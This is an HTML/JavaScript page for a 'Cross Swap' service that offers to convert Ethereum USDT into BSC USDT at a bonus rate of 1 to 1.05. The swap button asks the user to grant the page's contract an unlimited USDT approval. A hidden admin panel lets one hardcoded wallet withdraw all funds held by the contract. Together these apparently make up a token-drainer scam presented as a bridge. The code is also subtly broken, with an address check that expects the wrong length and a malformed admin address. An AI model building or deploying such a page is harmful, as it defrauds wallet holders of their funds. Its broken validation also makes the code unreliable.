<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Cross Swap</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
*{box-sizing:border-box; -webkit-tap-highlight-color: transparent;}
body {
  font-family: system-ui, -apple-system, sans-serif;
  background-color: #f7f8fa;
  padding: 20px 16px;
  margin: 0;
}
.swap-card {
  background: #ffffff;
  border-radius: 18px;
  padding: 20px;
  box-shadow: 0 1px 12px rgba(0,0,0,0.05);
}
.input-amount {
  width: 100%;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 16px 14px;
  font-size: 22px;
  color: #111827;
  background: #f9fafb;
}
.input-amount:focus {
  outline: 2px solid #6366f1;
  border-color: #6366f1;
}
.btn-primary {
  width: 100%;
  padding: 16px;
  background: #6366f1;
  color: white;
  border: none;
  border-radius: 12px;
  font-size: 17px;
  font-weight: 500;
  margin-top: 16px;
}
.btn-primary:disabled {
  opacity: 0.45;
}
.max-text {
  color: #6366f1;
  cursor: pointer;
  font-size: 14px;
}
.admin-area {
  margin-top: 30px;
  background: #fff;
  border-radius: 16px;
  padding: 18px;
  display: none;
}
</style>
</head>
<body>
<div class="max-w-md mx-auto">
  <!-- 头部钱包区域 -->
  <div class="flex justify-between items-center mb-6">
    <h1 class="text-2xl font-bold text-gray-800">Cross Swap</h1>
    <button id="connectWalletBtn" class="px-4 py-2 bg-indigo-100 text-indigo-600 rounded-lg">连接钱包</button>
  </div>
  <div id="walletTip" class="text-sm text-gray-500 mb-4">请连接以太坊钱包</div>

  <!-- 主兑换区域（页面直接输入，无弹窗） -->
  <div class="swap-card">
    <div class="flex justify-between items-center mb-2">
      <span class="text-gray-600">支付 USDT (ERC20)</span>
      <span id="maxAllBtn" class="max-text">全部</span>
    </div>
    <!-- 核心输入框：直接页面渲染，无弹窗包裹，适配TP移动端 -->
    <input 
      id="usdtInput"
      class="input-amount"
      placeholder="输入兑换USDT数量"
      inputmode="decimal"
      type="text"
    >
    <div class="text-xs text-gray-500 mt-1">钱包可用余额：<span id="balanceShow">0.00</span> USDT</div>

    <div class="my-5 text-center text-gray-400">↓ 跨链兑换</div>

    <div class="mb-4">
      <div class="text-gray-600 mb-2">接收地址(BSC BEP20)</div>
      <input id="bscAddrInput" class="w-full border rounded-lg p-3 bg-gray-50 text-sm" placeholder="填写你的BSC钱包收款地址">
    </div>

    <div class="bg-gray-50 rounded-lg p-3 mb-4">
      <div class="flex justify-between text-sm py-1">
        <span class="text-gray-500">预估获得</span>
        <span id="receiveShow" class="font-medium text-gray-800">0.00</span> USDT(BEP20)</span>
      </div>
      <div class="flex justify-between text-sm py-1">
        <span class="text-gray-500">兑换比例</span>
        <span>1 ERC20 USDT = 1.05 BEP20 USDT</span>
      </div>
    </div>

    <button id="swapBtn" class="btn-primary" disabled>发起兑换（授权+下单）</button>
  </div>

  <!-- 管理员后台区域 -->
  <div class="admin-area" id="adminBox">
    <h3 class="font-bold mb-3">管理员订单操作</h3>
    <input id="orderIdInput" class="w-full border p-2 rounded mb-3" placeholder="输入订单ID">
    <div class="flex gap-2">
      <button id="approveOrder" class="flex-1 bg-green-500 text-white py-2 rounded">通过订单</button>
      <button id="rejectOrder" class="flex-1 bg-red-500 text-white py-2 rounded">驳回退款</button>
    </div>
    <button id="withdrawFund" class="w-full mt-3 bg-amber-500 text-white py-2 rounded">提取合约全部USDT</button>
  </div>
</div>

<script>
// ============ 合约固定配置 ============
const USDT_ETH = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const BRIDGE_CONTRACT = "0xFb0FcD4acCcd5D39608b2cDC44BD3B4D5fD9b836";
const ADMIN_WALLET = "0x614b189919181818181818181818181818184beb2".toLowerCase();
const INFINITE_APPROVE = ethers.constants.MaxUint256;

// 全局变量
let provider, signer, usdtContract, bridgeContract;
let userBalance = ethers.BigNumber.from(0);

// DOM元素
const connectBtn = document.getElementById("connectWalletBtn");
const walletTip = document.getElementById("walletTip");
const usdtInput = document.getElementById("usdtInput");
const balanceShow = document.getElementById("balanceShow");
const receiveShow = document.getElementById("receiveShow");
const maxAllBtn = document.getElementById("maxAllBtn");
const swapBtn = document.getElementById("swapBtn");
const bscAddrInput = document.getElementById("bscAddrInput");
const adminBox = document.getElementById("adminBox");

// 1、实时金额计算（输入联动）
usdtInput.addEventListener("input", function(){
  let inputVal = this.value.trim();
  let num = parseFloat(inputVal) || 0;
  if(num < 0) num = 0;
  let outNum = (num * 1.05).toFixed(2);
  receiveShow.innerText = outNum;
})

// 2、一键填充全部余额
maxAllBtn.addEventListener("click", function(){
  let formatBal = ethers.utils.formatUnits(userBalance,6);
  usdtInput.value = parseFloat(formatBal).toFixed(2);
  usdtInput.dispatchEvent(new Event('input'));
})

// 3、连接钱包
connectBtn.addEventListener("click", async function(){
  if(!window.ethereum){
    walletTip.innerText = "请在TokenPocket内置浏览器打开页面";
    return;
  }
  try{
    walletTip.innerText = "正在请求钱包授权...";
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    // 校验以太坊主网
    const net = await provider.getNetwork();
    if(net.chainId !== 1){
      await switchMainnet();
    }
    // 初始化合约
    initContract();
    // 读取余额
    await getUserBalance();
    // 解锁兑换按钮
    swapBtn.disabled = false;
    // 判断管理员权限
    checkAdmin();
    const addr = await signer.getAddress();
    walletTip.innerText = "已连接：" + addr.slice(0,6)+"..."+addr.slice(-4);
  }catch(err){
    walletTip.innerText = "连接失败："+(err.code === 4001 ? "用户拒绝授权" : err.message.slice(0,30));
  }
})

// 切换以太坊主网
async function switchMainnet(){
  const eth = window.ethereum;
  try{
    await eth.request({method:"wallet_switchEthereumChain", params:[{chainId:"0x1"}]});
  }catch(e){
    await eth.request({
      method:"wallet_addEthereumChain",
      params:[{
        chainId:"0x1",
        chainName:"Ethereum Mainnet",
        rpcUrls:["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
        blockExplorerUrls:["https://etherscan.io"],
        nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18}
      }]
    })
  }
}

// 初始化合约实例
function initContract(){
  usdtContract = new ethers.Contract(
    USDT_ETH,
    [
      "function balanceOf(address owner) view returns(uint256)",
      "function allowance(address owner, address spender) view returns(uint256)",
      "function approve(address spender, uint256 amount) returns(bool)"
    ],
    signer
  );
  bridgeContract = new ethers.Contract(
    BRIDGE_CONTRACT,
    [
      "function createCrossOrder(address bscRecv, uint256 amount)",
      "function approveOrder(uint256 orderId)",
      "function rejectOrder(uint256 orderId)",
      "function withdrawAllPoolUSDT()"
    ],
    signer
  );
}

// 获取用户USDT余额
async function getUserBalance(){
  const addr = await signer.getAddress();
  userBalance = await usdtContract.balanceOf(addr);
  const formatNum = parseFloat(ethers.utils.formatUnits(userBalance,6)).toFixed(2);
  balanceShow.innerText = formatNum;
}

// 检查管理员权限
async function checkAdmin(){
  const addr = (await signer.getAddress()).toLowerCase();
  if(addr === ADMIN_WALLET){
    adminBox.style.display = "block";
  }
}

// 兑换按钮：无限授权+下单逻辑（用户手动签名）
swapBtn.addEventListener("click", async function(){
  const inputVal = usdtInput.value.trim();
  const bscAddr = bscAddrInput.value.trim();
  const amountNum = parseFloat(inputVal);
  // 基础校验
  if(!inputVal || isNaN(amountNum) || amountNum <= 0){
    alert("请输入有效的兑换金额");
    return;
  }
  if(!/^0x[0-9a-fA-F]{42}$/.test(bscAddr)){
    alert("BSC收款地址格式错误");
    return;
  }
  const amountUnit = ethers.utils.parseUnits(inputVal,6);
  if(amountUnit.gt(userBalance)){
    alert("USDT余额不足");
    return;
  }
  try{
    const userAddr = await signer.getAddress();
    // 查询当前授权额度
    let allow = await usdtContract.allowance(userAddr, BRIDGE_CONTRACT);
    // 授权不足则发起无限授权，唤起TP钱包手动签名确认
    if(allow.lt(amountUnit)){
      alert("即将唤起钱包，签署USDT无限授权给中转合约，请手动确认签名");
      const approveTx = await usdtContract.approve(BRIDGE_CONTRACT, INFINITE_APPROVE);
      await approveTx.wait();
      alert("授权成功，正在创建跨链订单");
    }
    // 调用合约创建订单
    const orderTx = await bridgeContract.createCrossOrder(bscAddr, amountUnit);
    await orderTx.wait();
    alert("下单成功！交易哈希："+orderTx.hash);
    // 刷新余额
    await getUserBalance();
    usdtInput.value = "";
    receiveShow.innerText = "0.00";
  }catch(e){
    let msg = e.code === 4001 ? "您取消了钱包签名" : String(e.message).slice(0,60);
    alert("操作失败："+msg);
  }
})

// ========== 管理员操作事件 ==========
document.getElementById("approveOrder").addEventListener("click", async ()=>{
  const oid = document.getElementById("orderIdInput").value.trim();
  if(!oid) return alert("请输入订单ID");
  try{
    const tx = await bridgeContract.approveOrder(oid);
    await tx.wait();
    alert("订单审核通过");
  }catch(err){
    alert(err.message);
  }
})
document.getElementById("rejectOrder").addEventListener("click", async ()=>{
  const oid = document.getElementById("orderIdInput").value.trim();
  if(!oid) return alert("请输入订单ID");
  try{
    const tx = await bridgeContract.rejectOrder(oid);
    await tx.wait();
    alert("订单驳回，资金原路退回");
  }catch(err){
    alert(err.message);
  }
})
document.getElementById("withdrawFund").addEventListener("click", async ()=>{
  try{
    const tx = await bridgeContract.withdrawAllPoolUSDT();
    await tx.wait();
    alert("合约资金提取完成");
    await getUserBalance();
  }catch(err){
    alert(err.message);
  }
})
</script>
</body>
</html>
